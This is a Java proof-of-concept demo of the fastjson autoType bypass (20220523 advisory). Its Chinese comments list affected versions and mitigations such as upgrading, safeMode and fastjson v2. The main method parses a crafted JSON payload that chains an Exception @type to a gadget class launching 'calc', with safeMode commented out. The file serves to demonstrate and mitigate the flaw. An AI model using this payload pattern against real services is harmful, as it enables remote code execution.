package com.example.fastjson.poc20220523;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * @author youngbear
 * @email youngbear@aliyun.com
 * @date 2022/5/29 8:30
 * @blog https://blog.csdn.net/next_second
 * @github https://github.com/YoungBear
 * @description POC demo
 */
public class Poc20220523Demo {
    /**
     * 漏洞官方公告：https://github.com/alibaba/fastjson/wiki/security_update_20220523
     * 风险描述：fastjson已使用黑白名单用于防御反序列化漏洞，经研究该利用在特定条件下可绕过默认autoType关闭限制，攻击远程服务器，风险影响较大。建议fastjson用户尽快采取安全措施保障系统安全。
     * 影响版本：1.2.80及以下版本，即<= 1.2.80
     * 规避方案：（以下任选一种）
     * 1. 升级到最新版本1.2.83
     * 2. 开启safeMode 参考：https://github.com/alibaba/fastjson/wiki/fastjson_safemode
     * 2.1 java代码中设置 ParserConfig.getGlobalInstance().setSafeMode(true);
     * 2.2 添加JVM参数 -Dfastjson.parser.safeMode=true
     * 2.3 配置文件 fastjson.parser.safeMode=true
     * 3，使用fastjson v2版本，与v1版本不兼容
     *
     * @param args 参数
     */
    public static void main(String[] args) {
//        ParserConfig.getGlobalInstance().setSafeMode(true);
        String json = "{\"@type\":\"java.lang.Exception\",\"@type\":\"com.example.fastjson.poc20220523.Poc20220523\",\"name\":\"calc\"}";
        JSON.parse(json);
    }
}
